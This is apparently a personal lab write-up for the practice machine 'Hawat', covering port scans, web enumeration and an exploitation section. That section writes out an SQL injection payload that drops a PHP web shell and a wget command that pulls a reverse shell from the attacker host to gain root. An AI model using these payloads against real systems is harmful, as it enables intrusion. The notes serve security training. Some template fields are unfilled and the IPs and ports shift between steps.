---
Alias: Hawat
Date: 5/08/2022
Platform: Linux
Difficulty: Easy
Tags: #issuetracker 
Status: Finished
IP: 192.168.151.147
---

# {{Hawat}}


# Resolution summary
- Text
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- nmap
- rustscan
- feroxbuster

---

# Information Gathering
Scanned all TCP ports:
```bash
#rustscan rustscan -a 192.168.151.147 --ulimit 5000 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.151.147:22
Open 192.168.151.147:17445
Open 192.168.151.147:30455
Open 192.168.151.147:50080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-20 21:22 EDT
Initiating Ping Scan at 21:22
Scanning 192.168.151.147 [2 ports]
Completed Ping Scan at 21:22, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:22
Completed Parallel DNS resolution of 1 host. at 21:22, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 21:22
Scanning 192.168.151.147 [4 ports]
Discovered open port 22/tcp on 192.168.151.147
Discovered open port 50080/tcp on 192.168.151.147
Discovered open port 30455/tcp on 192.168.151.147
Discovered open port 17445/tcp on 192.168.151.147
Completed Connect Scan at 21:22, 0.08s elapsed (4 total ports)
Nmap scan report for 192.168.151.147
Host is up, received conn-refused (0.086s latency).
Scanned at 2022-04-20 21:22:43 EDT for 0s

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
17445/tcp open  unknown syn-ack
30455/tcp open  unknown syn-ack
50080/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds


 

 

 

sudo nmap -sC -sV -O 192.168.151.147 -p 22,17445,30455,50080 

[sudo] password for kali:  

Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-20 21:26 EDT 

Nmap scan report for 192.168.151.147 

Host is up (0.079s latency). 

  

PORT      STATE SERVICE VERSION 

22/tcp    open  ssh     OpenSSH 8.4 (protocol 2.0) 

| ssh-hostkey:  

|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA) 

|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA) 

|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519) 

17445/tcp open  unknown 

| fingerprint-strings:  

|   GetRequest:  

|     HTTP/1.1 200  

|     X-Content-Type-Options: nosniff 

|     X-XSS-Protection: 1; mode=block 

|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate 

|     Pragma: no-cache 

|     Expires: 0 

|     X-Frame-Options: DENY 

|     Content-Type: text/html;charset=UTF-8 

|     Content-Language: en-US 

|     Date: Thu, 21 Apr 2022 01:26:28 GMT 

|     Connection: close 

|     <!DOCTYPE html> 

|     <html lang="en"> 

|     <head> 

|     <meta charset="UTF-8"> 

|     <title>Issue Tracker</title> 

|     <link href="/css/bootstrap.min.css" rel="stylesheet" /> 

|     </head> 

|     <body> 

|     <section> 

|     <div class="container mt-4"> 

|     <span> 

|     <div> 

|     href="/login" class="btn btn-primary" style="float:right">Sign In</a>  

|     href="/register" class="btn btn-primary" style="float:right;margin-right:5px">Register</a> 

|     </div> 

|     </span> 

|     <br><br> 

|     <table class="table"> 

|     <thead> 

|     <tr> 

|     <th>ID</th> 

|     <th>Message</th> 

|     <th>P 

|   HTTPOptions:  

|     HTTP/1.1 200  

|     Allow: GET,HEAD,OPTIONS 

|     X-Content-Type-Options: nosniff 

|     X-XSS-Protection: 1; mode=block 

|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate 

|     Pragma: no-cache 

|     Expires: 0 

|     X-Frame-Options: DENY 

|     Content-Length: 0 

|     Date: Thu, 21 Apr 2022 01:26:28 GMT 

|     Connection: close 

|   RTSPRequest:  

|     HTTP/1.1 400  

|     Content-Type: text/html;charset=utf-8 

|     Content-Language: en 

|     Content-Length: 435 

|     Date: Thu, 21 Apr 2022 01:26:28 GMT 

|     Connection: close 

|     <!doctype html><html lang="en"><head><title>HTTP Status 400  

|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400  

|_    Request</h1></body></html> 

30455/tcp open  http    nginx 1.18.0 

|_http-title: W3.CSS 

|_http-server-header: nginx/1.18.0 

50080/tcp open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.15) 

|_http-title: W3.CSS Template 

| http-methods:  

|_  Potentially risky methods: TRACE 

|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15 

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : 

SF-Port17445-TCP:V=7.92%I=7%D=4/20%Time=6260B2C2%P=x86_64-pc-linux-gnu%r(G 

SF:etRequest,623,"HTTP/1\.1\x20200\x20\r\nX-Content-Type-Options:\x20nosni 

SF:ff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nCache-Control:\x20no-cac 

SF:he,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nPragma:\x20no-cach 

SF:e\r\nExpires:\x200\r\nX-Frame-Options:\x20DENY\r\nContent-Type:\x20text 

SF:/html;charset=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Thu,\x202 

SF:1\x20Apr\x202022\x2001:26:28\x20GMT\r\nConnection:\x20close\r\n\r\n\n<! 

SF:DOCTYPE\x20html>\n<html\x20lang=\"en\">\n\t<head>\n\x20\x20\x20\x20\t<m 

SF:eta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20\t<title>Issue\x20Tracker</t 

SF:itle>\n\t\t<link\x20href=\"/css/bootstrap\.min\.css\"\x20rel=\"styleshe 

SF:et\"\x20/>\n\t</head>\n\t<body>\n\t\x20\x20\x20\x20<section>\n\t\t<div\ 

SF:x20class=\"container\x20mt-4\">\n\t\t\t<span>\n\x20\t\t\t\n\t\x20\x20\x 

SF:20\x20\x20\x20\x20\x20<div>\n\t\x20\x20\x20\x20\x20\x20\x20\x20\t<a\x20 

SF:href=\"/login\"\x20class=\"btn\x20btn-primary\"\x20style=\"float:right\ 

SF:">Sign\x20In</a>\x20\n\t\x20\x20\x20\x20\x20\x20\x20\x20\t<a\x20href=\" 

SF:/register\"\x20class=\"btn\x20btn-primary\"\x20style=\"float:right;marg 

SF:in-right:5px\">Register</a>\n\t\x20\x20\x20\x20\x20\x20\x20\x20</div>\n 

SF:\x20\x20\x20\x20\x20\x20\x20\x20</span>\n\t\t\t<br><br>\n\t\t\t<table\x 

SF:20class=\"table\">\n\t\t\t<thead>\n\t\t\t\t<tr>\n\t\t\t\t\t<th>ID</th>\ 

SF:n\t\t\t\t\t<th>Message</th>\n\t\t\t\t\t<th>P")%r(HTTPOptions,12B,"HTTP/ 

SF:1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nX-Content-Type-Options 

SF::\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nCache-Control: 

SF:\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nPragma:\ 

SF:x20no-cache\r\nExpires:\x200\r\nX-Frame-Options:\x20DENY\r\nContent-Len 

SF:gth:\x200\r\nDate:\x20Thu,\x2021\x20Apr\x202022\x2001:26:28\x20GMT\r\nC 

SF:onnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r 

SF:\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r 

SF:\nContent-Length:\x20435\r\nDate:\x20Thu,\x2021\x20Apr\x202022\x2001:26 

SF::28\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20la 

SF:ng=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20 

SF:Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma, 

SF:Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background 

SF:-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\ 

SF:x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bla 

SF:ck;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</s 

SF:tyle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R 

SF:equest</h1></body></html>"); 

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 

Device type: general purpose 

Running (JUST GUESSING): Linux 4.X|5.X (85%) 

OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 

Aggressive OS guesses: Linux 4.15 - 5.6 (85%), Linux 5.0 (85%) 

No exact OS matches for host (test conditions non-ideal). 

  

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 

Nmap done: 1 IP address (1 host up) scanned in 29.53 seconds 
```

Enumerated open TCP ports:
```bash
50080
30455
17445
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
##  Port 50080 - Apache httpd 2.4.46 ((Unix) PHP/7.4.15) 

#### -Ran feroxbuster scan [feroxbuster -u http://192.168.65.147:50080 -C 401 403 405] and found directory "/cloud"

![](Images/Pasted%20image%2020221011100749.png)


#### -Navigated to http://192.168.65.147:50080/cloud and found the following login php page:
![](Images/Pasted%20image%2020221011100923.png)

#### -Attempted to utilize username admin and password admin and was able to login as admin 

#### -Clicked on the issuetracker.zip file 
![](Images/Pasted%20image%2020221011101035.png)

#issuetracker

#### -The following webpage came up and clicked the 3 dots and clicked "Descargar" which allowed me to save the zip file to my kali machine:

![](Images/Pasted%20image%2020221011102057.png)

#### -Navigated throught the following source code folders for the "issuetracker.zip" file and found "IssueControler.java" file:

![](Images/Pasted%20image%2020221011102341.png)

![](Images/Pasted%20image%2020221011102413.png)

![](Images/Pasted%20image%2020221011102447.png)

![](Images/Pasted%20image%2020221011102523.png)

![](Images/Pasted%20image%2020221011102555.png)

![](Images/Pasted%20image%2020221011102626.png)

![](Images/Pasted%20image%2020221011102716.png)

#### -Located the following information:
#### "/issue/checkByPriority" directory
#### Credentials User "issue_user" and password "ManagementInsideOld797"
#### Issue Tracker connects to mysql database per the following line of code:
#### "jdbc:mysql://localhost:3306/issue_tracker"

![](Images/Pasted%20image%2020221011102828.png)

#### -Additionaly, I found "priority" as a parameter in the "/issue/checkByPriority" directory and should be vulnerable to sql injection:

![](Images/Pasted%20image%2020221011102910.png)

## Port 30455 - HTTP nginx 1.18.0 

#### -Ran feroxbuster scan and found the following:

![](Images/Pasted%20image%2020221011103134.png)

#### -Navigated to http://192.168.241.147:30455/phpinfo.php and found "/srv/http" showing the directory of the webserver:

![](Images/Pasted%20image%2020221011103221.png)

## Port 17445 - HTTP uknown

#### -Navigated to http://192.168.65.147:17445/ and found the following wepage showing as "Issue Tracker"

![](Images/Pasted%20image%2020221011103451.png)

#### -Clicked the "Register" link and registered and signed in with the credentials I created
#### -Navigated to directory "/issue/checkByPriority" per the findings this directory existed from analyzing the source code in the "IssueControler.java" file and was directed to the following web page:

![](Images/Pasted%20image%2020221011103541.png)

#### -As we know the directory "/issue/checkByPriority" exists I navigated to Burpsuite to confirm what is going on in the background. Forwarded the request to "repeater" and found the following showing that "POST" is allowed:

![](Images/Pasted%20image%2020221011103632.png)

#### -Changed "GET" to "POST" and found the error code changed from "405" to "400"

![](Images/Pasted%20image%2020221011103739.png)

#GETtoPOSTChangeInBurpsuite

---

# Exploitation
## SQL Injection in Burpsuite
#### -Googled "sql injection reverse shell" and found the following web page showing the following commands to upload a cmd.php page to the server in order to get command execution:

![](Images/Pasted%20image%2020221011103839.png)

![](Images/Pasted%20image%2020221011103926.png)

#### -URL encoded the following commands:
"' union select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile '/srv/http/cmd.php'"

#### -Added "priority='' paramater and the URL encoded syntax above into Burpsuite and forwarded the request:

![](Images/Pasted%20image%2020221011104021.png)

#### -Navigated to "http://192.168.213.147:30455/cmd.php?cmd=" and typed "whoami" and confirmed we can run os commands:

![](Images/Pasted%20image%2020221011104107.png)

#sqlinjection

#### -Saved "/usr/share/webshells/php/php-reverse-shell.php" to a file named "rev1.php" on my kali machine
#php-reverse-shell-php

#### -Typed "http://192.168.228.147/cmd.php?cmd=wget http://[kali IP]:30455/rev1.php -o /srv/http/rev1.php"
#### -Typed "http://192.168.228.147/cmd.php?cmd=mv rev1.php.1 rev2.php" as I found the reverse shell script got renamed to "rev1.php.1". (As the file originally ended in ".1" the reverse shell was unable to be executed as it needs to end in extension ".php" to execute)

#### -Set up a listener on port 30455. Typed "curl http://192.168.213.147:30455/rev2.php " on my kali machine and received a root shell:

![](Images/Pasted%20image%2020221011185330.png)
---
